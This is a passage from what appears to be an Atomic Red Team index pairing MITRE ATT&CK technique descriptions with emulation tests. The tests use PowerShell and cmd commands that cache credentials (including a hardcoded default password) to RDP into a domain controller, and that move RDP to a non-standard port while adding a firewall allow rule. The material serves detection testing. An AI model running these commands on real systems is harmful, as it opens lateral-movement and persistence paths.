      x_mitre_system_requirements:
      - RDP service enabled, account in the Remote Desktop Users group
      type: attack-pattern
      id: attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf
      created: '2020-02-11T18:23:26.059Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/001
        external_id: T1021.001
      - source_name: TechNet Remote Desktop Services
        description: Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1,
          2016.
        url: https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx
      - source_name: Alperovitch Malware
        description: Alperovitch, D. (2014, October 31). Malware-Free Intrusions.
          Retrieved November 4, 2014.
        url: http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1021.001
    atomic_tests:
    - name: RDP to DomainController
      auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
      description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.

        '
      supported_platforms:
      - windows
      input_arguments:
        logonserver:
          description: ComputerName argument default %logonserver%
          type: string
          default: $ENV:logonserver.TrimStart("\")
        domain:
          description: domain argument default %USERDOMAIN%
          type: string
          default: "$Env:USERDOMAIN"
        username:
          description: Username argument default %username%
          type: string
          default: "$ENV:USERNAME"
        password:
          description: Password
          type: string
          default: 1password2!
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          { exit 0} else { exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: |
          $Server=#{logonserver}
          $User = Join-Path #{domain} #{username}
          $Password="#{password}"
          cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
          mstsc /v:$Server
          echo "RDP connection established"
        cleanup_command: |
          $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
          if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
        name: powershell
    - name: Changing RDP Port to Non Standard Port via Powershell
      auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
      description: 'Changing RDP Port to Non Standard Port via Powershell

        '
      supported_platforms:
      - windows
      input_arguments:
        OLD_Remote_Port:
          description: Default RDP Listening Port
          type: string
          default: '3389'
        NEW_Remote_Port:
          description: New RDP Listening Port
          type: string
          default: '4489'
      executor:
        command: |
          Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
          New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
        cleanup_command: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal
          Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule
          -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service
          TermService | Restart-Service -Force -ErrorAction Ignore \n"
        name: powershell
        elevation_required: true
    - name: Changing RDP Port to Non Standard Port via Command_Prompt
      auto_generated_guid: 74ace21e-a31c-4f7d-b540-53e4eb6d1f73
      description: 'Changing RDP Port to Non Standard Port via Command_Prompt

        '
      supported_platforms:
      - windows
      input_arguments:
        OLD_Remote_Port:
          description: Default RDP Listening Port
          type: string
          default: '3389'
        NEW_Remote_Port:
          description: New RDP Listening Port
          type: string
          default: '4489'
      executor:
        command: |
          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f
          netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
        cleanup_command: |
          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} -f >nul 2>&1
          netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
          net stop TermService >nul 2>&1
          net start TermService >nul 2>&1
        name: command_prompt
        elevation_required: true
  T1550.001:
    technique:
      modified: '2023-05-04T18:04:17.588Z'
      name: Application Access Token
      description: "Adversaries may use stolen application access tokens to bypass
        the typical authentication process and access restricted accounts, information,
        or services on remote systems. These tokens are typically stolen from users
        or services and used in lieu of login credentials.\n\nApplication access tokens
        are used to make authorized API requests on behalf of a user or service and
        are commonly used to access resources in cloud, container-based applications,
        and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always
        Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented
        framework that issues tokens to users for access to systems. These frameworks
        are used collaboratively to verify the user and determine what actions the
        user is allowed to perform. Once identity is established, the token allows
        actions to be authorized, without passing the actual credentials of the user.
        Therefore, compromise of the token can grant the adversary access to resources
        of other sites through a malicious application.(Citation: okta)\n\nFor example,
        with a cloud-based email service, once an OAuth access token is granted to
        a malicious application, it can potentially gain long-term access to features
        of the user account if a \"refresh\" token enabling background access is awarded.(Citation:
        Microsoft Identity Platform Access 2019) With an OAuth access token an adversary
        can use the user-granted REST API to perform functions such as email searching
        and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised
        access tokens may be used as an initial step in compromising other services.
        For example, if a token grants access to a victimâ€™s primary email, the adversary
        may be able to extend access to all other services which the target subscribes
        by triggering forgotten password routines. In AWS and GCP environments, adversaries
        can trigger a request for a short-lived access token with the privileges of
        another user account.(Citation: Google Cloud Service Account Credentials)(Citation:
        AWS Temporary Security Credentials) The adversary can then use this token
        to request data or perform actions the original account could not. If permissions
        for this feature are misconfigured â€“ for example, by allowing all users to
        request a token for a particular account - an adversary may be able to gain
        initial access to a Cloud Account or escalate their privileges.(Citation:
        Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a
        token negates the effectiveness of a second authentication factor and may
        be immune to intuitive countermeasures like changing passwords.  For example,
        in AWS environments, an adversary who compromises a userâ€™s AWS API credentials
        may be able to use the `sts:GetFederationToken` API call to create a federated
        user session, which will have the same permissions as the original user but
        may persist even if the original user credentials are deactivated.(Citation:
        Crowdstrike AWS User Federation Persistence) Additionally, access abuse over
        an API channel can be difficult to detect even from the service provider end,
        as the access can still align well with a legitimate workflow."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Shailesh Tiwary (Indian Army)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Mark Wee
      - Jen Burns, HubSpot
      - Ian Davila, Tidal Cyber
      - Dylan Silva, AWS Security
      x_mitre_deprecated: false
      x_mitre_detection: 'Monitor access token activity for abnormal use and permissions
        granted to unusual or suspicious applications and APIs. Additionally, administrators
        should review logs for calls to the AWS Security Token Service (STS) and usage
        of GCP service accounts in order to identify anomalous actions.(Citation:
        AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Office 365
      - SaaS
      - Google Workspace
      - Containers
      - IaaS
      - Azure AD
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Web Credential: Web Credential Usage'
      x_mitre_defense_bypassed:
      - System Access Controls
      type: attack-pattern
      id: attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51
      created: '2020-01-30T17:37:22.261Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1550/001
        external_id: T1550.001
      - source_name: Crowdstrike AWS User Federation Persistence
        description: " Vaishnav Murthy and Joel Eng. (2023, January 30). How Adversaries
          Can Persist with AWS User Federation. Retrieved March 10, 2023."
        url: https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/
      - source_name: Auth0 - Why You Should Always Use Access Tokens to Secure APIs
          Sept 2019
        description: Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure
          APIs. Retrieved September 12, 2019.
        url: https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/
      - source_name: AWS Logging IAM Calls
        description: AWS. (n.d.). Logging IAM and AWS STS API calls with AWS CloudTrail.
          Retrieved April 1, 2022.
        url: https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html
      - source_name: AWS Temporary Security Credentials
        description: AWS. (n.d.). Requesting temporary security credentials. Retrieved
          April 1, 2022.
        url: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html
      - source_name: Microsoft Identity Platform Access 2019
        description: Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27).
          Microsoft identity platform access tokens. Retrieved October 4, 2019.
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens
      - source_name: Google Cloud Service Account Credentials
        description: Google Cloud. (2022, March 31). Creating short-lived service
          account credentials. Retrieved April 1, 2022.
        url: https://cloud.google.com/iam/docs/creating-short-lived-service-account-credentials
      - source_name: GCP Monitoring Service Account Usage
        description: Google Cloud. (2022, March 31). Monitor usage patterns for service
          accounts and keys . Retrieved April 1, 2022.
        url: https://cloud.google.com/iam/docs/service-account-monitoring
      - source_name: okta
        description: okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved
          September 12, 2019.
        url: https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen
      - source_name: Rhino Security Labs Enumerating AWS Roles
        description: 'Spencer Gietzen. (2018, August 8). Assume the Worst: Enumerating
          AWS Roles through â€˜AssumeRoleâ€™. Retrieved April 1, 2022.'
        url: https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration
      - source_name: Staaldraad Phishing with OAuth 2017
        description: Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure.
          Retrieved October 4, 2019.
        url: https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1077:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ffe742ed-9100-4686-9e00-c331da544787
      type: attack-pattern
      created: '2017-05-31T21:31:00.200Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1077
        url: https://attack.mitre.org/techniques/T1077
      - external_id: CAPEC-561
        source_name: capec
        url: https://capec.mitre.org/data/definitions/561.html
      - url: https://en.wikipedia.org/wiki/Server_Message_Block
        description: Wikipedia. (2016, June 12). Server Message Block. Retrieved June
          12, 2016.
        source_name: Wikipedia SMB
      - url: https://technet.microsoft.com/en-us/library/cc787851.aspx
        description: Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12,
          2016.
        source_name: TechNet RPC
      - url: http://support.microsoft.com/kb/314984
        description: Microsoft. (n.d.). How to create and delete hidden or administrative
          shares on client computers. Retrieved November 20, 2014.
        source_name: Microsoft Admin Shares
      - url: https://technet.microsoft.com/bb490717.aspx
        description: Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.
        source_name: Technet Net Use
      - url: https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts
        description: Payne, J. (2015, November 26). Tracking Lateral Movement Part
          One - Special Groups and Specific Service Accounts. Retrieved February 1,
          2016.
        source_name: Lateral Movement Payne
      - url: https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem
        description: Payne, J. (2015, November 23). Monitoring what matters - Windows
          Event Forwarding for everyone (even if you already have a SIEM.). Retrieved
          February 1, 2016.
        source_name: Windows Event Forwarding Payne
      - source_name: Medium Detecting Lateral Movement
        url: https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc
        description: French, D. (2018, September 30). Detecting Lateral Movement Using
          Sysmon and Splunk. Retrieved October 11, 2019.
      modified: '2020-03-23T19:54:12.651Z'
      name: Windows Admin Shares
      description: "Windows systems have hidden network shares that are accessible
        only to administrators and provide the ability for remote file copy and other
        administrative functions. Example network shares include <code>C$</code>,
        <code>ADMIN$</code>, and <code>IPC$</code>. \n\nAdversaries may use this technique
        in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        to remotely access a networked system over server message block (SMB) (Citation:
        Wikipedia SMB) to interact with systems using remote procedure calls (RPCs),
        (Citation: TechNet RPC) transfer files, and run transferred binaries through
        remote Execution. Example execution techniques that rely on authenticated
        sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
        [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows
        Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries
        can also use NTLM hashes to access administrator shares on systems with [Pass
        the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration
        and patch levels. (Citation: Microsoft Admin Shares)\n\nThe [Net](https://attack.mitre.org/software/S0039)
        utility can be used to connect to Windows admin shares on remote systems using
        <code>net use</code> commands with valid credentials. (Citation: Technet Net
        Use)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Ensure that proper logging of accounts used to log into
        systems is turned on and centrally collected. Windows logging is able to collect
        success/failure for accounts that may be used to move laterally and can be
        collected using tools such as Windows Event Forwarding. (Citation: Lateral
        Movement Payne) (Citation: Windows Event Forwarding Payne) Monitor remote
        login events and associated SMB activity for file transfers and remote process
        execution. Monitor the actions of remote users who connect to administrative
        shares. Monitor for use of tools and commands to connect to remote shares,
        such as [Net](https://attack.mitre.org/software/S0039), on the command-line
        interface and Discovery techniques that could be used to find remotely accessible
        systems.(Citation: Medium Detecting Lateral Movement)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      x_mitre_system_requirements:
      - |-
        File and printer sharing over SMB enabled.
        Host/network firewalls not blocking SMB ports between source and destination.
        Use of domain account in administrator group on remote system or default system admin account.
      x_mitre_is_subtechnique: false
    atomic_tests: []
